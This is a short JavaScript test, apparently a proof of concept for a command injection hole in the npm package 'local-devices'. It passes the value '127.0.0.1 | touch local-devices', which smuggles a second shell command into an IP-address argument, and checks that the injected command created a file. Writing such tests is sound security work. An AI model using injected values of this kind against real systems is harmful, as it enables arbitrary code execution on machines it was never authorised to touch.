test("Arbitrary code execution in local-devices", () => {
  const fs = require("fs");
  const find = require("local-devices");
  const path = "./local-devices";

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  let userInput = "127.0.0.1 | touch local-devices";
  find(userInput).then(() => {
    //checking that its created by after exploit.
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);

    fs.unlink(path, function (err) {}); //deleting the file after creation
  });

  //sleep.sleep(5);
});
